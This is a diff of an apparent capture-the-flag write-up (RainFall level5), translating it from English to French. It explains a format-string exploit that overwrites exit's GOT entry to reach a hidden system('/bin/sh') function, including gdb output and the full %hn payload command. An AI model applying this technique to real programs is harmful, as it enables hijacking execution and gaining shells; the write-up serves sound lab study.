@@ -1,6 +1,6 @@
-# Level 5
+# 05 - Format string 3
 
-- We login as user level5:
+- On se connecte en tant que level5:
 ```
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
 No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level5/level5
@@ -46,7 +46,7 @@ End of assembler dump.
 ```
 
 
-- Let's identify the calls and jump by execution order:
+- Voyons les parties les plus importantes du programme:
 ```
    0x080484d0 <+14>:    mov    %eax,0x8(%esp)
    0x080484d4 <+18>:    movl   $0x200,0x4(%esp)
@@ -54,30 +54,24 @@ End of assembler dump.
    0x080484e2 <+32>:    mov    %eax,(%esp)
    0x080484e5 <+35>:    call   0x80483a0 <fgets@plt>
 ```
->`0x8049848 <stdin@@GLIBC_2.0>: 0xb7fd1ac0`
-
->buffer size is 0x200 bytes
-
->buffer starts at `-0x208(%ebp)`
-
->Prompt the user for up to 512 bytes.
+>Prompt stdin pour 512 octets dans une zone mémoire de 520 octets.
 
 ```
    0x080484ea <+40>:    lea    -0x208(%ebp),%eax
    0x080484f0 <+46>:    mov    %eax,(%esp)
    0x080484f3 <+49>:    call   0x8048380 <printf@plt>
 ```
->Call `<printf@plt>` with our buffer.
+>Appelle `printf()` avec notre buffer.
 
 
 ```
    0x080484f8 <+54>:    movl   $0x1,(%esp)
    0x080484ff <+61>:    call   0x80483d0 <exit@plt>
 ```
->Call `exit()`
+>Se termine en `exit(1)`.
 
 
-- Thanks to `<printf@plt>`, we can redirect the program's execution flow by modifying the behavior of `call 0x80483d0 <exit@plt>`.
+- `<printf@plt>` nous permet d'écrire n'importe quoi n'importe ou dans la mémoire. Ici, nous allons réécrire l'adresse du `jmp` fait par `call 0x80483d0 <exit@plt>` pour qu'il pointe vers une autre fonction.
 ```
 (gdb) x 0x80483d0
    0x80483d0 <exit@plt>:        jmp    *0x8049838
@@ -88,9 +82,6 @@ End of assembler dump.
    0x80483db <exit@plt+11>:     jmp    0x8048370
 ```
 
-
-- When the program executes `call 0x80483d0 <exit@plt>`, it actually `jmp` to the instruction located at the address contained in `0x8049838`, which is at `0x80483d6`, where it will execute `push $0x28`.
-By changing the value stored at address `0x8049838`, you can redirect the program's execution flow. You could, therefore, make it execute shellcode instead, but if you `(gdb) info functions`:
 ```
 All defined functions:
 
@@ -117,18 +108,19 @@ End of assembler dump.
 >`0x80485f0: "/bin/sh"`
 
 
-- Look! A function that is not called anywhere but calls `system("/bin/sh")`! By putting the value `0804 84a4` into `0x8049838`, the program's execution should be redirected to this function.
+- Tiens! Une fonction qui n'est appelée nulle part mais qui fait `system("/bin/sh")`!
+
+- En mettant la valeur `080484a4` dans `0x8049838`, l'exécution du programme devrait être redirigée vers cette fonction.
 >Low order bytes = 84a4 (33 956 in decimal)
 
 >High order bytes = 0804 (2052 in decimal)
 
 >`\x40\x98\04\x08\x38\x98\x04\x08 %VALUE1x %4$hn %VALUE2x %5$hn`
 
->`VALUE1 (0x8049840)` ==> 2052 - 8 bytes for the addresses - 2 bytes for the spaces = 2042
+>`VALUE1 (0x8049840)` ==> 2052 - 8 bytes for the addresses - 2 bytes for the spaces = **2042**
 
->`VALUE2 (0x8049838)` ==> 33 956 - 2052 - 2 bytes for the spaces = 31 902
+>`VALUE2 (0x8049838)` ==> 33 956 - 2052 - 2 bytes for the spaces = **31 902**
 
-- So:
 ```
 level5@RainFall:~$ (echo -ne '\x40\x98\04\x08\x38\x98\x04\x08 %2042x %4$hn %31902x %5$hn'; cat) | ./level5
 ...
